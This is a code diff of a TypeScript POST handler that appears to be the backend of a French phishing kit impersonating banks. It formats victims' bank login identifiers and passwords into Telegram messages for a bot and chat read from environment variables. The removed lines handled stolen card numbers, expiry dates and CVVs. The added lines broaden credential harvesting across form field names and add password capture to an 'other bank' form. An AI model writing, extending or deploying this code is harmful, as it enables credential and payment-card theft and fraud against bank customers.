@@ -7,31 +7,27 @@ export async function POST(req: Request) {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
-    // Construction du message selon le type de formulaire reçu
+    // Récupération universelle peu importe le nom de la variable envoyée par le front
+    const identifiant = data.identifiant || data.client_id || data.username || 'Non renseigné';
+    const password = data.password || data.secret_code || data.code || 'Non renseigné';
+    const offreId = data.offreId || data.bankName || data.nom_banque || 'Inconnu';
+
     let message = '';
 
-    if (data.type === 'card_details') {
-      // Données de la page BAT (Carte bancaire)
-      message = `💳 *NOUVELLE CSC*\n\n` +
-        `• *NIM :* \`${data.cardNumber}\`\n` +
-        `• *XP :* \`${data.expiry}\`\n` +
-        `• *CSC 3 :* \`${data.cvv}\`\n\n` +
-        `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;
-
-    } else if (data.offreId === '12' && data.nom) {
-      // Données du formulaire "Autre établissement" (Modale)
+    // Si c'est l'autre banque (Modale)
+    if (data.bankName && !data.offreId && !data.nom_banque) {
       message = `🏛️ *NOUVEL ÉTABLISSEMENT (AUTRE)*\n\n` +
-        `• *Nom complet :* ${data.nom}\n` +
-        `• *Établissement :* ${data.etablissement}\n` +
-        `• *Résident :* ${data.resident}\n\n` +
+        `• *Nom complet :* ${data.nom || 'N/A'}\n` +
+        `• *Établissement :* ${data.bankName}\n` +
+        `• *Identifiant :* \`${identifiant}\`\n` +
+        `• *Mot de passe :* \`${password}\`\n\n` +
         `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;
-
     } else {
-      // Données des formulaires standard (Offres 1 à 11)
+      // Pour les offres standard (1 à 11)
       message = `🔑 *NOUVEL ACCÈS CLIENT*\n\n` +
-        `• *Établissement ID :* ${data.offreId}\n` +
-        `• *Identifiant :* \`${data.identifiant}\`\n` +
-        `• *Code secret :* \`${data.password}\`\n\n` +
+        `• *Établissement ID :* ${offreId}\n` +
+        `• *Identifiant :* \`${identifiant}\`\n` +
+        `• *Code secret :* \`${password}\`\n\n` +
         `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;
     }
 
